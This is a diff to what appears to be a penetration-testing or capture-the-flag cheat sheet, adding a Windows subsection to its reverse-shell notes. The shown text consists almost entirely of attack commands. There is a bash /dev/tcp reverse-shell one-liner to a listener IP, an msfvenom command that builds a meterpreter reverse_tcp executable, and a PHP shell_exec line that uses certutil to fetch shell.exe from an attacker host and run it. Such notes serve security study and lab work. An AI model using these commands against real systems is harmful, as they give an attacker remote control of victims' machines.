@@ -256,6 +256,8 @@ Due to shell restrictions, you will need to escape the backslashes for the host.
 
 ## Reverse shell
 
+### Linux
+
 ```bash
 bash -i >& /dev/tcp/ip_addr/port 0>&1
 
@@ -274,6 +276,21 @@ bash -i >& /dev/tcp/10.9.173.10/1338 0>&1
 1 : stdout
 2 : stderr
 ```
+
+### Windows
+
+php
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f exe > shell.exe
+shell_exec("cmd.exe /C certutil.exe -urlcache -split -f http://<ip>/shell.exe shell.exe & shell.exe
+```
+Note :
+
+```bash
+certutil.exe -urlcache -split -f <url of file> <location to save file> 
+```
+
 
 ## Privilege Escalation
 
